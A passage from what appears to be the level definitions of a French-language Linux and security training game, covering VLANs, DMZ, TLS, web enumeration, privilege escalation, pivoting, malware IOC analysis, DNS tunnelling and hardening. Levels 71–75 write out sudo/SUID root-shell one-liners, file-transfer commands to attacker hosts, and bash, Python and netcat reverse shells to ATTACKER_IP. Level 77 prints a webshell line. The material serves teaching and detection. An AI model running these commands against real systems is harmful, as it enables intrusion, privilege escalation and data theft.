    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Comprendre l'architecture VLAN et ses implications",
    description: "Un VLAN (Virtual LAN) segmente logiquement un réseau physique. Chaque VLAN a son propre sous-réseau. La communication inter-VLAN nécessite un routeur ou switch L3. `ip link show` et `ip addr` révèlent les interfaces VLAN (ex: `eth0.10` = eth0 tagué VLAN 10).",
    commands: ['ip', 'cat'],
    hints: [
      "`ip addr` — cherche des interfaces nommées `eth0.10`, `eth0.20` (notation VLAN).",
      "`cat /etc/network/interfaces` — configuration réseau avec tags VLAN.",
      "Un poste en VLAN 10 ne peut pas parler directement à VLAN 20 sans routage inter-VLAN."
    ],
    fileSystem: {
      'network_diagram.txt': `Architecture VLAN EduCorp :
  VLAN 10 — Management   : 10.10.10.0/24  (admin uniquement)
  VLAN 20 — Serveurs     : 10.20.20.0/24  (web, bdd, app)
  VLAN 30 — Utilisateurs : 10.30.30.0/24  (postes de travail)
  VLAN 40 — DMZ          : 10.40.40.0/24  (services exposés)
  VLAN 99 — Native       : non-taggué (risque VLAN hopping)

Interdictions :
  VLAN 30 → VLAN 10 : BLOQUÉ (utilisateurs ≠ admin)
  VLAN 30 → VLAN 20 : BLOQUÉ sauf ports spécifiques
  Internet → VLAN 40 : AUTORISÉ (DMZ)
  VLAN 40 → VLAN 20 : BLOQUÉ sauf règles strictes`,
      'vlan_config.txt': `# Configuration switch Cisco (référence)
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 30
interface FastEthernet0/24
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40`
    },
    validation: [
      { type: 'command', value: 'ip addr', description: 'Observer les interfaces réseau et VLAN' },
      { type: 'command', value: 'cat /etc/network/interfaces', description: 'Lire la configuration réseau' }
    ],
    story: "🏗️ L'entreprise a segmenté son réseau en VLANs. Comprends l'architecture avant d'analyser les flux autorisés."
  },
  {
    id: 67,
    title: "DMZ — Zone démilitarisée",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Comprendre et analyser une architecture DMZ",
    description: "La DMZ expose des services vers Internet (web, mail, DNS) tout en les isolant du LAN interne. Un firewall avec 3 interfaces : WAN, DMZ, LAN. Règles typiques : Internet→DMZ (ports spécifiques), DMZ→LAN (bloqué sauf relais), LAN→DMZ (libre).",
    commands: ['cat', 'iptables', 'ip'],
    hints: [
      "`cat firewall_rules.txt` — lit les règles de filtrage en place.",
      "`iptables -L -n -v` — liste les règles iptables (simulées).",
      "La DMZ est le compromis : exposée mais isolée du LAN. Si un serveur DMZ est compromis, l'attaquant ne doit pas atteindre le LAN interne."
    ],
    fileSystem: {
      'firewall_rules.txt': `# Règles firewall DMZ (pseudo-iptables)

# WAN → DMZ (autorisé sur ports spécifiques)
ACCEPT  TCP  any → 10.40.40.10:80   (HTTP serveur web)
ACCEPT  TCP  any → 10.40.40.10:443  (HTTPS serveur web)
ACCEPT  TCP  any → 10.40.40.20:25   (SMTP serveur mail)
ACCEPT  UDP  any → 10.40.40.30:53   (DNS résolveur)

# DMZ → LAN (très restreint)
ACCEPT  TCP  10.40.40.10 → 10.20.20.5:3306  (web→bdd: RISQUE)
DROP    ALL  10.40.40.0/24 → 10.10.10.0/24  (DMZ≠management)
DROP    ALL  10.40.40.0/24 → 10.30.30.0/24  (DMZ≠utilisateurs)

# LAN → DMZ (monitoring/admin)
ACCEPT  TCP  10.10.10.0/24 → 10.40.40.0/24:22  (SSH admin)
ACCEPT  ALL  10.30.30.0/24 → 10.40.40.0/24      (utilisateurs→services)

# DEFAULT
DROP    ALL  any → any`,
      'dmz_risk.txt': `Risques fréquents en DMZ :
1. Connexion directe DMZ→LAN interne (base de données)
   → Si le serveur web est compromis, l'attaquant atteint la BDD
2. Règle "DMZ → LAN any" trop permissive
3. SSH admin ouvert depuis Internet
4. Pas de séparation mail/web dans la DMZ`
    },
    validation: [
      { type: 'command', value: 'cat firewall_rules.txt', description: 'Analyser les règles de filtrage DMZ' },
      { type: 'command', value: 'cat dmz_risk.txt', description: 'Identifier les risques de l\'architecture' }
    ],
    story: "🛡️ L'équipe sécurité demande un audit de l'architecture DMZ. Analyse les règles de filtrage et identifie les chemins d'attaque potentiels."
  },
  {
    id: 68,
    title: "Proxy HTTP — Analyse de trafic",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Utiliser curl avec un proxy et analyser les headers",
    description: "Un proxy HTTP intercepte les requêtes. `curl -x http://proxy:8080 URL` passe par un proxy. `curl -I` récupère les headers. Les headers révèlent : serveur web, technologie, cookies de session, politiques de sécurité (CSP, HSTS).",
    commands: ['curl'],
    hints: [
      "`curl -I http://10.40.40.10` — headers de réponse (server, X-Powered-By...).",
      "`curl -v http://10.40.40.10` — échange HTTP complet avec les headers de requête et réponse.",
      "Un header `X-Powered-By: PHP/7.2` indique une version PHP potentiellement obsolète."
    ],
    fileSystem: {
      'http_headers_guide.txt': `Headers HTTP importants (sécurité) :

Côté serveur (réponse) :
  Server: Apache/2.4.29  → version connue = CVEs possibles
  X-Powered-By: PHP/7.2  → version PHP (déprécié : vulnérabilités)
  X-Frame-Options: DENY  → protection clickjacking
  Strict-Transport-Security → force HTTPS (HSTS)
  Content-Security-Policy   → protection XSS
  Set-Cookie: session=abc; HttpOnly; Secure → sécurité cookies

Headers dangereux (absents = vulnérable) :
  ❌ Pas de X-Frame-Options → clickjacking possible
  ❌ Pas de CSP             → XSS plus facile
  ❌ Cookie sans HttpOnly   → vol via JavaScript`
    },
    validation: [
      { type: 'command', value: 'curl -I', description: 'Récupérer les headers HTTP de la cible' },
      { type: 'command', value: 'curl -v', description: 'Analyser l\'échange HTTP complet' }
    ],
    story: "🕵️ Le site en DMZ tourne. Avant de chercher des vulnérabilités, commence par ce que le serveur révèle sur lui-même dans ses headers."
  },
  {
    id: 69,
    title: "OpenSSL — Inspection de certificats",
    difficulty: 'intermediate',
    category: "Réseau",
    objective: "Inspecter un certificat TLS avec openssl",
    description: "`openssl s_client -connect host:443` ouvre une connexion TLS et affiche le certificat. Infos utiles : dates de validité, CN (Common Name), SANs (Subject Alternative Names = autres domaines couverts), émetteur.",
    commands: ['openssl'],
    hints: [
      "`openssl s_client -connect 10.40.40.10:443` — connexion TLS et affichage du certificat.",
      "Cherche `subject=CN=`, `notBefore=`, `notAfter=` dans la sortie.",
      "`echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -text` — lecture propre."
    ],
    fileSystem: {
      'tls_notes.txt': `Points à vérifier sur un certificat TLS :
  CN / SAN  : domaines couverts (révèle d'autres sous-domaines)
  Issuer    : Let's Encrypt = gratuit/auto | DigiCert = entreprise
  notAfter  : date d'expiration
  Version   : TLSv1.3 = ok | TLSv1.0/1.1 = obsolète/vulnérable
  Cipher    : AES-256-GCM = bon | RC4, DES = vulnérable

Attention : un certificat valide ≠ serveur sécurisé.
Il confirme juste l'identité — pas l'absence de vulnérabilités.`
    },
    validation: [
      { type: 'command', value: 'openssl s_client', description: 'Inspecter le certificat TLS' }
    ],
    story: "🔒 Le site expose du HTTPS. Le certificat lui-même peut révéler d'autres sous-domaines internes ou des technologies utilisées."
  },
  {
    id: 70,
    title: "Énumération de répertoires web",
    difficulty: 'intermediate',
    category: "Reconnaissance",
    objective: "Découvrir des répertoires cachés avec gobuster/dirb (simulation)",
    description: "L'énumération web cherche des chemins non liés dans le sitemap mais accessibles : `/admin`, `/backup`, `/.git`, `/api/v1`, `/phpinfo.php`. Dans ce simulateur, utilise `curl` combiné à une liste de chemins.",
    commands: ['curl', 'cat'],
    hints: [
      "`curl -I http://10.40.40.10/admin` — code 200 = existe, 403 = interdit, 404 = inexistant.",
      "`cat wordlist.txt | while read path; do curl -s -o /dev/null -w \"%{http_code} $path\\n\" http://10.40.40.10/$path; done`",
      "Les codes 200 et 301/302 indiquent des ressources accessibles."
    ],
    fileSystem: {
      'wordlist.txt': `admin
login
backup
.git
api
api/v1
phpinfo.php
wp-admin
upload
uploads
config
config.php
.env
robots.txt
sitemap.xml`,
      'results.txt': `Résultats du scan (simulation) :
200 /admin         ← ACCESSIBLE
200 /backup        ← ACCESSIBLE
403 /.git          ← INTERDIT (mais existe !)
200 /api/v1        ← API exposée
200 /phpinfo.php   ← CRITIQUE : infos système exposées
200 /robots.txt
404 /wp-admin`
    },
    validation: [
      { type: 'command', value: 'curl -I http', description: 'Tester l\'accessibilité d\'un chemin web' },
      { type: 'command', value: 'cat results.txt', description: 'Analyser les résultats d\'énumération' }
    ],
    story: "📂 Un site web propre en surface peut cacher des chemins sensibles accessibles. `phpinfo.php` en production ? C'est une fuite d'infos critiques."
  },

  // 🔓 Niveaux 71-80 : Hacking avancé
  {
    id: 71,
    title: "Élévation de privilèges — Sudo",
    difficulty: 'advanced',
    category: "PrivEsc",
    objective: "Exploiter une mauvaise configuration sudo pour obtenir root",
    description: "`sudo -l` liste ce que l'utilisateur peut exécuter avec sudo. Si un binaire est autorisé sans mot de passe (`NOPASSWD`) et permet d'exécuter du code, il peut être utilisé pour obtenir un shell root (cf. GTFOBins).",
    commands: ['sudo'],
    hints: [
      "`sudo -l` — affiche tes permissions sudo.",
      "Un `(ALL) NOPASSWD: /usr/bin/vim` = tu peux exécuter vim en root, donc ouvrir un shell.",
      "GTFOBins (gtfobins.github.io) liste les binaires exploitables via sudo."
    ],
    fileSystem: {
      'sudo_analysis.txt': `sudo -l → résultat :
User student may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less

Exploitation via 'find' (GTFOBins) :
  sudo find . -exec /bin/bash \\; -quit
  → shell root immédiat

Exploitation via 'less' :
  sudo less /etc/passwd
  puis taper : !/bin/bash
  → shell root

Moral : sudo NOPASSWD sur des binaires capables d'exécuter du code = privesc triviale.`,
      'gtfobins_ref.txt': `Binaires exploitables courants (sudo):
  find    : sudo find . -exec /bin/sh \\;
  vim     : sudo vim -c ':!/bin/sh'
  python  : sudo python -c 'import os; os.system("/bin/sh")'
  perl    : sudo perl -e 'exec "/bin/sh"'
  awk     : sudo awk 'BEGIN {system("/bin/sh")}'
  nmap    : sudo nmap --interactive (vieilles versions)`
    },
    validation: [
      { type: 'command', value: 'sudo -l', description: 'Lister les permissions sudo de l\'utilisateur' }
    ],
    story: "⬆️ Tu as un accès limité sur la machine. `sudo -l` te réserve peut-être une surprise."
  },
  {
    id: 72,
    title: "Élévation de privilèges — SUID avancé",
    difficulty: 'advanced',
    category: "PrivEsc",
    objective: "Trouver et exploiter un binaire SUID non standard",
    description: "`find / -perm -4000 -type f 2>/dev/null` liste tous les binaires SUID. Les binaires SUID *standards* (passwd, su) sont attendus. Un binaire SUID *non standard* (cp, vim, bash) est exploitable pour lire des fichiers protégés ou obtenir root.",
    commands: ['find', 'ls'],
    hints: [
      "`find / -perm -4000 -type f 2>/dev/null` — liste les SUID sur tout le système.",
      "Compare avec une liste de SUID standards : tout ce qui n'est pas attendu est suspect.",
      "`/bin/bash` avec SUID root : `bash -p` ouvre un shell root (preserved privileges)."
    ],
    fileSystem: {
      'suid_found.txt': `Binaires SUID trouvés (find / -perm -4000) :
/usr/bin/passwd       ← standard (changer son mot de passe)
/usr/bin/su           ← standard
/usr/bin/sudo         ← standard
/bin/ping             ← standard
/usr/bin/python3      ← NON STANDARD ⚠️
/usr/local/bin/backup ← NON STANDARD ⚠️
/bin/bash             ← NON STANDARD ⚠️ CRITIQUE

Exploitation /bin/bash SUID root :
  bash -p
  → whoami retourne "root"
  
Exploitation /usr/bin/python3 SUID :
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
    },
    validation: [
      { type: 'command', value: 'find / -perm -4000', description: 'Lister tous les binaires SUID' }
    ],
    story: "🔓 Un développeur a mis le bit SUID sur un mauvais binaire. Une commande `find` bien construite suffit à le repérer."
  },
  {
    id: 73,
    title: "Transfert de fichiers — Techniques offensives",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Transférer des outils sur une machine compromise",
    description: "Après un accès initial, il faut souvent transférer des outils. Méthodes : `wget`, `curl`, `python -m http.server` (serveur HTTP), `nc` (netcat), base64 (encode puis decode). Chaque méthode a ses avantages selon ce qui est disponible.",
    commands: ['wget', 'curl', 'python3', 'nc', 'base64'],
    hints: [
      "Méthode 1 — HTTP : `python3 -m http.server 8080` sur l'attaquant, `wget http://IP:8080/tool` sur la cible.",
      "Méthode 2 — base64 : `base64 tool > tool.b64`, copie le texte, puis `base64 -d tool.b64 > tool` sur la cible.",
      "Méthode 3 — netcat : `nc -l -p 4444 < tool` attaquant, `nc 192.168.1.100 4444 > tool` cible."
    ],
    fileSystem: {
      'transfer_methods.txt': `Méthodes de transfert de fichiers (post-exploitation) :

1. HTTP Server (Python)
   Attaquant : python3 -m http.server 8080
   Cible      : wget http://attacker:8080/linpeas.sh

2. Netcat
   Attaquant : nc -l -p 4444 < linpeas.sh
   Cible      : nc 10.10.14.1 4444 > linpeas.sh

3. Base64 (si seulement accès texte)
   Attaquant : base64 linpeas.sh
   Cible      : echo "BASE64..." | base64 -d > linpeas.sh
   Cible      : chmod +x linpeas.sh && ./linpeas.sh

4. SCP (si SSH dispo)
   scp linpeas.sh user@target:/tmp/

5. /dev/tcp (bash pur, pas de binaires)
   cat linpeas.sh > /dev/tcp/attacker/4444`
    },
    validation: [
      { type: 'command', value: 'wget', description: 'Télécharger un outil via HTTP' },
      { type: 'command', value: 'base64 -d', description: 'Décoder un transfert base64' }
    ],
    story: "📤 Tu as un shell sur la machine cible mais pas accès à `wget`. Quelles alternatives as-tu pour transférer linpeas.sh ?"
  },
  {
    id: 74,
    title: "Pivoting — Port Forwarding",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Accéder à un réseau interne via un hôte compromis",
    description: "Le pivoting utilise un hôte compromis comme relais vers un réseau autrement inaccessible. SSH local forwarding : `ssh -L port_local:cible_interne:port user@jump`. SOCKS proxy : `ssh -D 9050 user@jump` + proxychains.",
    commands: ['ssh'],
    hints: [
      "`ssh -L 3306:10.20.20.5:3306 student@jump.target.com` — accès à la BDD interne via localhost:3306.",
      "`ssh -D 9050 student@jump.target.com` — proxy SOCKS5 sur port 9050.",
      "Avec proxychains : `proxychains nmap 10.20.20.0/24` — scan du réseau interne via le tunnel."
    ],
    fileSystem: {
      'pivot_scenario.txt': `Topologie :
  Toi (10.10.14.1)
    │ Internet
    ▼
  jump.target.com (192.168.1.100) ← accès SSH obtenu
    │ Réseau interne (inaccessible depuis Internet)
    ├─ 10.20.20.5  : MySQL (port 3306)
    ├─ 10.20.20.10 : HTTP interne (port 80)
    └─ 10.10.10.1  : Management (port 22)

Objectif : accéder à MySQL sur 10.20.20.5:3306

Commande :
  ssh -L 3306:10.20.20.5:3306 student@jump.target.com -N
Résultat :
  mysql -h 127.0.0.1 -P 3306 -u root -p
  → connexion au MySQL interne !`
    },
    validation: [
      { type: 'command', value: 'ssh -L', description: 'Créer un tunnel de port forwarding local' }
    ],
    story: "🕳️ Tu contrôles un hôte en DMZ. Derrière, un réseau interne avec des bases de données. Le pivot SSH te donne accès."
  },
  {
    id: 75,
    title: "Reverse Shell — Détection et compréhension",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Comprendre les reverse shells et leur détection",
    description: "Un reverse shell fait rappeler la machine cible vers l'attaquant. `bash -i >& /dev/tcp/IP/PORT 0>&1` est le one-liner bash classique. Côté défense : détecter des connexions sortantes inhabituelles vers des IPs externes sur des ports non standards.",
    commands: ['nc', 'ss', 'grep'],
    hints: [
      "Côté attaquant (listener) : `nc -l -p 4444` — attend la connexion.",
      "Côté défense : `ss -tnp | grep ESTAB` — connexions TCP établies + processus.",
      "Signe d'alerte : bash ou sh qui a une connexion réseau établie vers une IP externe."
    ],
    fileSystem: {
      'revshell_detection.txt': `Indicateurs de reverse shell actif :

1. Process avec connexion réseau :
   lsof -i -n -P | grep bash
   → bash PID 1337 TCP 10.0.0.5:4321->185.220.101.5:4444

2. ss / netstat :
   ss -tnp | grep ESTAB
   → ESTAB 0 0 10.0.0.5:4321 185.220.101.5:4444 users:(("bash",pid=1337))

3. Connexion sortante non standard :
   Port 4444, 1234, 9001 vers IP externe ≠ gateway habituelle

4. /proc/PID/fd :
   ls -la /proc/1337/fd
   → 0 → socket (stdin depuis réseau = reverse shell !)`,
      'revshell_oneliner.txt': `Reverse shells courants (à des fins éducatives — lab uniquement) :

Bash :
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Python :
  python3 -c 'import socket,subprocess,os;s=socket.socket();
  s.connect(("ATTACKER_IP",4444));
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
  subprocess.call(["/bin/bash","-i"])'

Netcat :
  nc -e /bin/bash ATTACKER_IP 4444

Tous ces patterns sont détectés par EDR/SIEM modernes.`
    },
    validation: [
      { type: 'command', value: 'ss -tnp', description: 'Détecter une connexion reverse shell active' },
      { type: 'command', value: 'cat revshell_detection.txt', description: 'Analyser les indicateurs de détection' }
    ],
    story: "🚨 Les IDS ont levé une alerte : connexion sortante inhabituelle depuis le serveur web. Reverse shell ? Analyse les connexions actives."
  },
  {
    id: 76,
    title: "Brute Force SSH — Compréhension & protection",
    difficulty: 'advanced',
    category: "Sécurité",
    objective: "Analyser une attaque brute-force et configurer fail2ban",
    description: "Hydra (`hydra -l root -P wordlist.txt ssh://IP`) automatise les tentatives de connexion. Côté défense : `fail2ban` bannit les IPs après N échecs. `fail2ban-client status sshd` affiche les IPs bannies.",
    commands: ['cat', 'grep'],
    hints: [
      "`cat /etc/fail2ban/jail.conf` — configuration du banissement (maxretry, bantime).",
      "`grep 'Ban' /var/log/fail2ban.log` — IPs bannies récemment.",
      "Une protection efficace : `maxretry=3, bantime=86400` + authentification par clé uniquement."
    ],
    fileSystem: {
      'fail2ban_config.txt': `# /etc/fail2ban/jail.local (configuration recommandée)
[DEFAULT]
maxretry = 3
bantime  = 86400   # 24h en secondes
findtime = 600     # fenêtre de détection : 10 min

[sshd]
enabled  = true
port     = ssh
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 3

# État actuel : fail2ban-client status sshd
# Banned IPs : 185.220.101.5, 103.99.0.122, 45.33.32.156`,
      'hardening_ssh.txt': `Durcissement SSH recommandé (/etc/ssh/sshd_config) :

PermitRootLogin no          ← jamais root en SSH direct
PasswordAuthentication no   ← clés uniquement
MaxAuthTries 3              ← limiter les tentatives
AllowUsers student admin    ← whitelist d'utilisateurs
Protocol 2                  ← SSHv2 uniquement
X11Forwarding no
PermitEmptyPasswords no`
    },
    validation: [
      { type: 'command', value: 'cat fail2ban_config.txt', description: 'Lire la configuration fail2ban' },
      { type: 'command', value: 'grep Ban /var/log/fail2ban.log', description: 'Voir les IPs bannies' }
    ],
    story: "🔨 Le serveur subit 500 tentatives de connexion SSH par minute. Fail2ban est-il configuré correctement ?"
  },
  {
    id: 77,
    title: "Analyse de malware — Strings & comportement",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Extraire des indicateurs d'un fichier suspect avec strings",
    description: "`strings fichier` extrait toutes les chaînes de caractères lisibles d'un binaire. Indicateurs recherchés : URLs, IPs, noms de domaines, clés de registre Windows, chemins de fichiers, commandes système.",
    commands: ['strings', 'cat', 'grep'],
    hints: [
      "`strings malware.bin | grep -E 'http|https'` — extraire les URLs.",
      "`strings malware.bin | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` — extraire les IPs.",
      "`strings malware.bin | grep -i 'password\\|passwd\\|pwd'` — recherche de mots-clés sensibles."
    ],
    fileSystem: {
      'strings_output.txt': `Sortie de : strings malware.bin

/bin/bash
/tmp/.x
curl
http://185.220.101.5:8080/gate.php
User-Agent: Mozilla/5.0
POST /api/collect
{"hostname":"%s","user":"%s","os":"Linux"}
/etc/passwd
/etc/shadow
id_rsa
authorized_keys
/var/www/html/.webshell.php
<?php system($_GET['cmd']); ?>
crontab -l
* * * * * /tmp/.x
XOR_KEY_0x42
AES-256-CBC`,
      'ioc_analysis.txt': `IOCs extraits de malware.bin :

Réseau :
  C2 : http://185.220.101.5:8080/gate.php
  Endpoint : POST /api/collect
  User-Agent suspect (légitime mais utilisé pour blend-in)

Système :
  Crée : /tmp/.x (persistance)
  Lit   : /etc/passwd, /etc/shadow, ~/.ssh/id_rsa
  Ajoute: crontab (* * * * * /tmp/.x)
  Dépose: /var/www/html/.webshell.php

Crypto : XOR + AES-256-CBC (obfuscation du trafic)`
    },
    validation: [
      { type: 'command', value: 'strings', description: 'Extraire les chaînes d\'un binaire suspect' },
      { type: 'command', value: 'cat ioc_analysis.txt', description: 'Analyser les IOCs identifiés' }
    ],
    story: "🦠 Un binaire suspect a été récupéré sur le serveur compromis. Que fait-il ? Extrais ses IOCs pour alimenter le SIEM."
  },
  {
    id: 78,
    title: "Tunnel DNS — Exfiltration avancée",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter et analyser une exfiltration via DNS",
    description: "Le DNS tunneling encode des données dans des requêtes DNS pour exfiltrer/C2 en contournant les firewalls. Signes : requêtes vers des sous-domaines longs aléatoires, volume anormal de requêtes DNS, domaine inconnu non catégorisé.",
    commands: ['cat', 'grep', 'cut', 'sort'],
    hints: [
      "`cat dns_tunnel.log | grep -v 'google\\|cloudflare\\|microsoft'` — filtrer les DNS légitimes.",
      "`cut -d' ' -f5 dns_tunnel.log | cut -d. -f2- | sort | uniq -c | sort -rn` — domaines racines les plus contactés.",
      "Longueur anormale du sous-domaine (>30 chars) = souvent données encodées en base64/hex."
    ],
    fileSystem: {
      'dns_tunnel.log': `2024-01-15 14:00:01 client=192.168.1.50 query=google.com type=A
2024-01-15 14:00:05 client=192.168.1.50 query=github.com type=A
2024-01-15 14:01:00 client=192.168.1.50 query=aGVsbG93b3JsZA.tunnel.c2evil.xyz type=A
2024-01-15 14:01:01 client=192.168.1.50 query=dGhpcyBpcyBzZWNyZXQ.tunnel.c2evil.xyz type=A
2024-01-15 14:01:02 client=192.168.1.50 query=aW5mb3JtYXRpb24gZm9y.tunnel.c2evil.xyz type=A
2024-01-15 14:01:03 client=192.168.1.50 query=YXR0YWNrZXJzb25seQ.tunnel.c2evil.xyz type=A
2024-01-15 14:02:00 client=192.168.1.50 query=stackoverflow.com type=A
2024-01-15 14:03:00 client=192.168.1.50 query=dGhpcyBpcyBhIGRuc3Q.tunnel.c2evil.xyz type=A
2024-01-15 14:03:01 client=192.168.1.50 query=dW5uZWwgYXR0YWNr.tunnel.c2evil.xyz type=A`,
      'detection_tips.txt': `Détection DNS Tunneling :

1. Volume : >100 requêtes/min vers même domaine = suspect
2. Longueur subdomain : >25 chars aléatoires = encodage probable
3. Fréquence fixe : requête toutes les Xms = C2 heartbeat
4. Domaine inconnu non catégorisé dans threat intel

Outils de détection :
  - Zeek/Bro : analyse comportementale DNS
  - Suricata : règles signatures
  - PassiveDNS : baseline normale vs anomalies

Outils d'attaque (éducatif) :
  - iodine : DNS tunneling IPv4 over DNS
  - dnscat2 : C2 over DNS`
    },
    validation: [
      { type: 'command', value: 'grep c2evil dns_tunnel.log', description: 'Isoler les requêtes vers le domaine C2' },
      { type: 'command', value: 'cat detection_tips.txt', description: 'Analyser les méthodes de détection' }
    ],
    story: "📡 Le firewall ne bloque que HTTP/HTTPS. L'attaquant exfiltre via DNS. Prouve-le à partir des logs."
  },
  {
    id: 79,
    title: "Hardening Linux — Audit de configuration",
    difficulty: 'advanced',
    category: "Sécurité",
    objective: "Auditer la configuration d'un serveur avec une checklist",
    description: "Le hardening Linux réduilt la surface d'attaque : désactiver services inutiles, vérifier SSH, permissions, kernel parameters, comptes sans mot de passe. Outil de référence : `lynis` (audit automatisé).",
    commands: ['cat', 'grep', 'find', 'ss'],
    hints: [
      "`cat /etc/ssh/sshd_config | grep -E 'Root|Password|Auth'` — config SSH critique.",
      "`find / -name '*.conf' -readable -not -path '*/proc/*' 2>/dev/null` — fichiers de config lisibles.",
      "`ss -tulnp | grep '0.0.0.0'` — services exposés sur toutes interfaces."
    ],
    fileSystem: {
      'hardening_checklist.txt': `# Audit Hardening Linux — Checklist

[ ] SSH
    PermitRootLogin no ............. ❌ actuellement: yes
    PasswordAuthentication no ...... ✅
    MaxAuthTries 3 ................. ❌ actuellement: 6 (défaut)

[ ] Services inutiles
    Telnet installé ................ ❌ désinstaller
    FTP en clair ................... ❌ désinstaller
    NFS sans auth .................. ❌ à désactiver

[ ] Permissions
    /etc/passwd readable root ...... ✅
    /etc/shadow world-readable ..... ❌ chmod 640
    Fichiers SUID non standard ..... ❌ voir /usr/bin/python3

[ ] Kernel
    net.ipv4.ip_forward=0 .......... ✅ (routage désactivé)
    kernel.randomize_va_space=2 .... ✅ (ASLR actif)

[ ] Mises à jour
    Dernière MAJ système ........... 2023-06-15 ❌ (>6 mois)`,
      'lynis_score.txt': `Lynis audit score : 58/100

Hardening index: [####      ] 58%

Findings :
  [WARNING]  Found 3 world-writable directories
  [WARNING]  PermitRootLogin is set to yes
  [SUGGESTION] Install fail2ban
  [SUGGESTION] Enable automatic security updates`
    },
    validation: [
      { type: 'command', value: 'cat hardening_checklist.txt', description: 'Lire le rapport d\'audit hardening' },
      { type: 'command', value: 'cat lynis_score.txt', description: 'Analyser le score Lynis' }
    ],
    story: "🛡️ Avant de déployer ce serveur en production, réalise un audit de hardening. Le score actuel est insuffisant."
  },
  {
    id: 80,
    title: "CTF Final — Compromission complète",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Chaîne complète : recon → exploitation → privesc → proof",
    description: "Mission finale technique. Enchaîne toutes les phases d'un pentest : reconnaissance (nmap, dns), exploitation (header, service vulnérable), post-exploitation (SUID, sudo), preuve (cat /root/flag.txt).",
    commands: ['nmap', 'curl', 'ssh', 'find', 'sudo', 'cat'],
    hints: [
      "Phase 1 — Recon : `nmap -sV 10.0.0.99` — quels services ?",
      "Phase 2 — Enum web : `curl -I http://10.0.0.99` — version serveur ?",
      "Phase 3 — Accès : le fichier `creds.txt` contient des identifiants SSH.",
      "Phase 4 — PrivEsc : `sudo -l` après connexion.",
      "Phase 5 — Proof : `cat /root/flag.txt`"
    ],
    fileSystem: {
      'creds.txt': `Identifiants récupérés (phase d'enum) :
SSH → student:EduLinux2024!
Hôte : 10.0.0.99`,
      '/root/flag.txt': `FLAG{T3rm1n4l_W4rr10r_L3v3l_80}

Félicitations — tu as complété le parcours complet EduLinux.
Recon → Exploitation → Post-Exploitation → Forensic

Prochaine étape : HackTheBox, TryHackMe, Root-Me`
    },
    validation: [
      { type: 'command', value: 'nmap -sV', description: 'Phase 1 — Reconnaissance des services' },
      { type: 'command', value: 'curl -I http', description: 'Phase 2 — Énumération web' },
      { type: 'command', value: 'sudo -l', description: 'Phase 4 — Vérification des privilèges sudo' },
      { type: 'command', value: 'cat /root/flag.txt', description: 'Phase 5 — Capture du flag' }
    ],
    story: "🏁 MISSION FINALE — Compromission complète d'une machine. Recon → foothold → privesc → root. Démontre que tu maîtrises la chaîne d'attaque complète. Cette compétence s'exerce uniquement sur des labs autorisés (HTB, THM, Root-Me)."
  },

  // ─── Niveaux 81-90 : Bash Scripting Avancé ───────────────────────────────────
  {
    id: 81,
    title: "Boucles — for et while",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Utiliser les boucles for et while dans un script bash",
    description: "`for item in liste; do ... done` itère sur une liste. `while condition; do ... done` boucle tant que la condition est vraie. `for i in $(seq 1 10)` génère une séquence de nombres.",
    commands: ['for', 'while', 'seq', 'echo'],
    hints: [
      "`for f in *.log; do echo \"Fichier : $f\"; done` — itère sur des fichiers.",
      "`while read line; do echo \"$line\"; done < fichier.txt` — lit un fichier ligne par ligne.",
      "`for i in $(seq 1 5); do echo \"Itération $i\"; done`"
    ],
    fileSystem: {
      'logs': {
        'app.log': 'ERROR: connexion refusée\nINFO: démarrage ok\nERROR: timeout\nINFO: requête traitée'
      },
      'names.txt': `alice
bob
charlie
diana
eve`
    },
    validation: [
      { type: 'command', value: 'for', description: 'Écrire une boucle for' },
      { type: 'command', value: 'while', description: 'Écrire une boucle while' }
    ],
    story: "🔁 Automatise une tâche répétitive. Les boucles bash te feront gagner des heures sur des fichiers en masse."
  },
  {
    id: 82,
    title: "Fonctions bash",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Définir et appeler des fonctions dans un script bash",
    description: "Une fonction bash : `nom_fonction() { commandes; }`. Appelée par son nom. Paramètres accessibles via `$1`, `$2`... `$@` = tous les paramètres. `return N` retourne un code de sortie.",
    commands: ['echo', 'cat', 'chmod'],
    hints: [
      "Définition : `greet() { echo \"Bonjour $1\"; }`",
      "Appel : `greet Alice` → affiche \"Bonjour Alice\"",
      "`$?` = code de retour de la dernière commande (0 = succès, ≠0 = erreur)"
    ],
    fileSystem: {
      'functions_template.sh': `#!/bin/bash

# Exemple de fonctions bash

# Fonction avec paramètres
log_message() {
    local level="$1"
    local msg="$2"
    echo "[$(date +%H:%M:%S)] [$level] $msg"
}

# Fonction avec valeur de retour
is_root() {
    [ "$(id -u)" -eq 0 ]
    return $?
}

# Utilisation
log_message "INFO" "Script démarré"
log_message "ERROR" "Quelque chose a échoué"
`,
    },
    validation: [
      { type: 'command', value: 'cat functions_template.sh', description: 'Lire le template de fonctions' },
      { type: 'command', value: 'chmod +x', description: 'Rendre le script exécutable' }
    ],
    story: "🧩 Un bon script bash est modulaire. Les fonctions évitent la duplication et rendent le code maintenable."
  },
  {
    id: 83,
    title: "Conditions — if / elif / case",
    difficulty: 'intermediate',
    category: "Bash Avancé",
    objective: "Utiliser les structures conditionnelles bash",
    description: "`if [ condition ]; then ... elif ...; else ...; fi`. Tests courants : `-f fichier` (existe et est un fichier), `-d dir` (est un répertoire), `-z string` (chaîne vide), `-eq` (égalité numérique). `case` pour des alternatives multiples.",
